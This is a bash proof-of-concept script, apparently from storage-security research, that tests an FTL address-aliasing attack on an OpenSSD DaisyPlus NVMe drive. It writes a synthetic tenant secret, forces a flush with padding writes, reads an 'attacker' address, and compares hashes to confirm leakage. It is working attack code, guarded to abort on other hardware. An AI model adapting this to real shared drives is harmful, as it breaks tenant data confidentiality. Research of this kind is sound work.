#!/usr/bin/env bash
# On-silicon alias-attack demo. Commits victim to NAND via chunked padding
# (MDTS-safe: probes the largest accepted transfer). DaisyPlus-only guard.
set -u
DEV=/dev/nvme0; NS=/dev/nvme0n1
MODEL=$(nvme id-ctrl "$DEV" 2>/dev/null | awk -F: '/^mn /{sub(/^[ ]+/,"",$2);print $2}')
echo "Target $DEV model: [$MODEL]"
case "$MODEL" in *DaisyPlus*|*OpenSSD*) : ;; *) echo "ABORT: not DaisyPlus (got '$MODEL')."; exit 1;; esac

WORK=$(mktemp -d); trap 'rm -rf "$WORK"' EXIT
VICTIM_LBA=4096; ATTACK_LBA=8192; CTRL_LBA=12288   # LSA 1024 / 2048 / 3072
PAD_LBA=100000; PAD_SLICES=1024                     # >> buffer (~128 entries)
CNT=3; SZ=16384                                     # 4 blocks = 1 slice
SCRATCH_LBA=200000

python3 - "$WORK" <<'PY'
import sys,os; w=sys.argv[1]
open(os.path.join(w,"victim.bin"),"wb").write((b"VICTIM-SECRET!! tenant A private data. "*500)[:16384])
open(os.path.join(w,"control.bin"),"wb").write((b"CONTROL-neutral tenant C block. "*600)[:16384])
open(os.path.join(w,"pad.bin"),"wb").write((b"PADDING-flush "*80000)[:1048576])   # 1 MiB pattern
PY

# --- probe largest MDTS-safe chunk (in 4KB blocks) ---
CHUNK=0
for c in 256 128 64 32 16 8 4; do
  if nvme write "$NS" --start-block=$SCRATCH_LBA --block-count=$((c-1)) --data-size=$((c*4096)) --data="$WORK/pad.bin" >/dev/null 2>&1; then
    CHUNK=$c; break
  fi
done
[ "$CHUNK" -gt 0 ] || { echo "could not find a working chunk size"; exit 1; }
echo "MDTS-safe chunk = $CHUNK blocks ($((CHUNK*4096/1024)) KiB)"

echo "== write victim secret -> LSA 1024 =="
nvme write "$NS" --start-block=$VICTIM_LBA --block-count=$CNT --data-size=$SZ --data="$WORK/victim.bin" || exit 1
echo "== write control -> LSA 3072 =="
nvme write "$NS" --start-block=$CTRL_LBA --block-count=$CNT --data-size=$SZ --data="$WORK/control.bin" || exit 1

echo "== padding $PAD_SLICES slices (chunks of $CHUNK blocks) to evict buffer -> commit to NAND =="
pad_blocks=$((PAD_SLICES*4)); lba=$PAD_LBA; done_b=0
while [ $done_b -lt $pad_blocks ]; do
  step=$CHUNK; [ $((done_b+step)) -gt $pad_blocks ] && step=$((pad_blocks-done_b))
  nvme write "$NS" --start-block=$lba --block-count=$((step-1)) --data-size=$((step*4096)) --data="$WORK/pad.bin" >/dev/null 2>&1 \
    || { echo "padding write failed at lba $lba"; exit 1; }
  lba=$((lba+step)); done_b=$((done_b+step))
done
nvme flush "$NS" 2>/dev/null
echo "   padding done ($done_b blocks written)"

echo "== read victim / control / ATTACKER =="
nvme read "$NS" --start-block=$VICTIM_LBA --block-count=$CNT --data-size=$SZ --data="$WORK/victim.read" || exit 1
nvme read "$NS" --start-block=$CTRL_LBA  --block-count=$CNT --data-size=$SZ --data="$WORK/control.read" || exit 1
nvme read "$NS" --start-block=$ATTACK_LBA --block-count=$CNT --data-size=$SZ --data="$WORK/attack.read" || exit 1

echo; echo "===================== RESULT ====================="
vs=$(sha256sum "$WORK/victim.read"|awk '{print $1}'); cs=$(sha256sum "$WORK/control.read"|awk '{print $1}'); as=$(sha256sum "$WORK/attack.read"|awk '{print $1}')
echo "victim.read  sha256 = $vs"; echo "control.read sha256 = $cs"; echo "attack.read  sha256 = $as"
echo; echo "attacker LSA 2048 read, first 48 bytes:"; head -c 48 "$WORK/attack.read"; echo; echo
if [ "$as" = "$vs" ] && [ "$as" != "$cs" ]; then
  echo ">>> ATTACK CONFIRMED: attacker LSA 2048 read returned the VICTIM's secret."
  echo ">>> FTL aliased LSA 2048 -> LSA 1024 on real silicon (confidentiality break)."
elif [ "$as" = "$cs" ]; then echo ">>> attacker == control (unexpected)."
else echo ">>> No alias (attacker != victim). victim first 48 bytes:"; head -c 48 "$WORK/victim.read"; echo; fi
echo "=================================================="
